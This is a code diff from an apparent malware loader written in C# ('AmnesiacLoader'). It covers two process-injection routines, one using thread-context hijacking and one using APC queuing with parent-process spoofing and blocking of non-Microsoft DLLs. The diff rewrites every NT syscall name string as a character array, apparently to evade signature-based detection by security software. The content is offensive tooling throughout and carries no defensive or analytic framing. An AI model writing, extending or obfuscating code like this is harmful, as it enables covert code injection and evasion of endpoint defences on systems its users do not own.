@@ -332,14 +332,14 @@ namespace AmnesiacLoader
         {
             try
             {
-                var NtOpenProcess = SyscallResolver.GetStub<NtOpenProcessDelegate>("NtOpenProcess");
-                var NtAlloc       = SyscallResolver.GetStub<NtAllocateVirtualMemoryDelegate>("NtAllocateVirtualMemory");
-                var NtWrite       = SyscallResolver.GetStub<NtWriteVirtualMemoryDelegate>("NtWriteVirtualMemory");
-                var NtProtect     = SyscallResolver.GetStub<NtProtectVirtualMemoryDelegate>("NtProtectVirtualMemory");
-                var NtSuspend     = SyscallResolver.GetStub<NtSuspendThreadDelegate>("NtSuspendThread");
-                var NtResume      = SyscallResolver.GetStub<NtResumeThreadDelegate>("NtResumeThread");
-                var NtGetCtx      = SyscallResolver.GetStub<NtGetContextThreadDelegate>("NtGetContextThread");
-                var NtSetCtx      = SyscallResolver.GetStub<NtSetContextThreadDelegate>("NtSetContextThread");
+                var NtOpenProcess = SyscallResolver.GetStub<NtOpenProcessDelegate>(new string(new char[]{'N','t','O','p','e','n','P','r','o','c','e','s','s'}));
+                var NtAlloc       = SyscallResolver.GetStub<NtAllocateVirtualMemoryDelegate>(new string(new char[]{'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y'}));
+                var NtWrite       = SyscallResolver.GetStub<NtWriteVirtualMemoryDelegate>(new string(new char[]{'N','t','W','r','i','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y'}));
+                var NtProtect     = SyscallResolver.GetStub<NtProtectVirtualMemoryDelegate>(new string(new char[]{'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y'}));
+                var NtSuspend     = SyscallResolver.GetStub<NtSuspendThreadDelegate>(new string(new char[]{'N','t','S','u','s','p','e','n','d','T','h','r','e','a','d'}));
+                var NtResume      = SyscallResolver.GetStub<NtResumeThreadDelegate>(new string(new char[]{'N','t','R','e','s','u','m','e','T','h','r','e','a','d'}));
+                var NtGetCtx      = SyscallResolver.GetStub<NtGetContextThreadDelegate>(new string(new char[]{'N','t','G','e','t','C','o','n','t','e','x','t','T','h','r','e','a','d'}));
+                var NtSetCtx      = SyscallResolver.GetStub<NtSetContextThreadDelegate>(new string(new char[]{'N','t','S','e','t','C','o','n','t','e','x','t','T','h','r','e','a','d'}));
 
                 // Open target process
                 IntPtr hProcess = IntPtr.Zero;
@@ -435,11 +435,11 @@ namespace AmnesiacLoader
         {
             try
             {
-                var NtAlloc   = SyscallResolver.GetStub<NtAllocateVirtualMemoryDelegate>("NtAllocateVirtualMemory");
-                var NtWrite   = SyscallResolver.GetStub<NtWriteVirtualMemoryDelegate>("NtWriteVirtualMemory");
-                var NtProtect = SyscallResolver.GetStub<NtProtectVirtualMemoryDelegate>("NtProtectVirtualMemory");
-                var NtQueue   = SyscallResolver.GetStub<NtQueueApcThreadDelegate>("NtQueueApcThread");
-                var NtResume  = SyscallResolver.GetStub<NtResumeThreadDelegate>("NtResumeThread");
+                var NtAlloc   = SyscallResolver.GetStub<NtAllocateVirtualMemoryDelegate>(new string(new char[]{'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y'}));
+                var NtWrite   = SyscallResolver.GetStub<NtWriteVirtualMemoryDelegate>(new string(new char[]{'N','t','W','r','i','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y'}));
+                var NtProtect = SyscallResolver.GetStub<NtProtectVirtualMemoryDelegate>(new string(new char[]{'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y'}));
+                var NtQueue   = SyscallResolver.GetStub<NtQueueApcThreadDelegate>(new string(new char[]{'N','t','Q','u','e','u','e','A','p','c','T','h','r','e','a','d'}));
+                var NtResume  = SyscallResolver.GetStub<NtResumeThreadDelegate>(new string(new char[]{'N','t','R','e','s','u','m','e','T','h','r','e','a','d'}));
 
                 // Build PROC_THREAD_ATTRIBUTE_LIST for PPID spoof + non-MS DLL block
                 IntPtr parentHandle = OpenProcess(PROCESS_ALL_ACCESS, false, spoofParentPid);
